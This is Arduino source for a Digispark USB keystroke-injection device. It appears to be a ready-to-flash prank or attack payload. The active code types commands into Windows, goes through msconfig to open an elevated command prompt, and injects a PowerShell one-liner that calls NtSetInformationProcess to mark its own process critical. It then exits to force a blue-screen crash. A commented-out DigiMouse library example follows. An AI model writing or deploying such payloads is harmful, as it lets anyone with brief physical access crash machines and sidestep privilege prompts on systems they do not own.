#include "DigiKeyboard.h"

#define KEY_TAB 0x2B
#define KEY_DOWN_ARROW 0x51

void setup() {
    DigiKeyboard.delay(750);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("msconfig -5"); //starting msconfig
  DigiKeyboard.delay(500);
 for(int i =0; i < 14; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
    } 
  DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT); //Launch CMD
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //starting powershell
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("$F=NEW-OBJECT SYSTEM.REFLECTION.ASSEMBLYNAME('BS');$B=[APPDOMAIN]::CURRENTDOMAIN.DEFINEDYNAMICASSEMBLY($F,[REFLECTION.EMIT.ASSEMBLYBUILDERACCESS]::RUN);$C=$B.DEFINEDYNAMICMODULE('BS', $FALSE);$E=$C.DEFINETYPE('BS.WIN32.NTDLL', 'PUBLIC, CLASS');$D=$E.DEFINEPINVOKEMETHOD('NtSetInformationProcess', 'NTDLL.DLL',([REFLECTION.METHODATTRIBUTES]'PUBLIC, STATIC'),[REFLECTION.CALLINGCONVENTIONS]::STANDARD,[INT32],[TYPE[]]@([INTPTR],[UINT32],[INTPTR].MAKEBYREFTYPE(),[UINT32]),[RUNTIME.INTEROPSERVICES.CALLINGCONVENTION]::WINAPI,[RUNTIME.INTEROPSERVICES.CHARSET]::AUTO);$J=$E.CREATETYPE();$H=[DIAGNOSTICS.PROCESS]::GETCURRENTPROCESS().HANDLE;$I=[SYSTEM.RUNTIME.INTEROPSERVICES.MARSHAL]::ALLOCHGLOBAL(4);$A=29;$G=4;$NULL=$J::NtSetInformationProcess($H, $A,[REF]$I, $G);")); //adding mayhem
  DigiKeyboard.println("exit"); //killing the critical process and BSOD

}

void loop() {
   DigiKeyboard.update();
}

// DigiMouse test and usage documentation
// CAUTION!!!! This does click things!!!!!!!!
// Originally created by Sean Murphy (duckythescientist)

//#include <DigiMouse.h>
//
//void setup() {
//  DigiMouse.begin(); //start or reenumerate USB - BREAKING CHANGE from old versions that didn't require this
//}
//
//void loop() {
//  // If not using plentiful DigiMouse.delay(), make sure to call
//  // DigiMouse.update() at least every 50ms
//  
//  // move across the screen
//  // these are signed chars
//  DigiMouse.moveY(10); //down 10
//  DigiMouse.delay(500);
//  DigiMouse.moveX(20); //right 20
//  DigiMouse.delay(500);
//  DigiMouse.scroll(5);
//  DigiMouse.delay(500);
//  
//  // or DigiMouse.move(X, Y, scroll) works
//  
//  // three buttons are the three LSBs of an unsigned char
//  DigiMouse.setButtons(1<<0); //left click
//  DigiMouse.delay(500);
//  DigiMouse.setButtons(0); //unclick all
//  DigiMouse.delay(500);
//
//  //or you can use these functions to click
//  DigiMouse.rightClick();
//  DigiMouse.delay(500);
//  DigiMouse.leftClick();
//  DigiMouse.delay(500);
//  DigiMouse.middleClick();
//  DigiMouse.delay(500);
//
//  //for compatability with other libraries you can also use DigiMouse.move(X, Y, scroll, buttons)
//}
